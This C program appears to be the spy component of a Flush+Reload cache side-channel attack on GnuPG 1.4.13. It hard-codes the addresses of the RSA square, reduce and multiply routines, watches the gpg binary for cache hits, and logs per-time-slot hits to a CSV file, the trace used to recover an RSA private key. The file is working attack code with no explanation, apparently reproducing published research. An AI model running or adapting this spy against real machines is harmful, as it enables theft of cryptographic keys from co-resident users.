#include "fr/fr.h"

#define RSA_SQUARE (void*)0xbb9e5
#define RSA_REDUCE (void*)0xbaf9f
#define RSA_MULTIPLY (void*)0xbb367

#define RSA_SQUARE_IDX 1
#define RSA_REDUCE_IDX 2
#define RSA_MULTIPLY_IDX 3

int main(int argc, char** argv) {

	FR fr = fr_init( 2048*100, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);

	fr.hit_begin=0;
	fr.hit_end=230;
	//fr_calibrate(&fr, 1.0, 1000000, "scripts/calibration.csv");

	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");

	FILE* file = fopen("spy.log", "w");

	// create csv
	fprintf(file, "timeslot, square, reduce, multiply\n");
	for(unsigned int i=0; i < fr.num_time_slots; i++) {

		fprintf(file, "%u, %u, %u, %u\n",
				i,
				fr.results[i * fr.len],
				fr.results[i * fr.len + 1],
				fr.results[i * fr.len + 2]);
	}

	fclose(file);

	return 0;
}
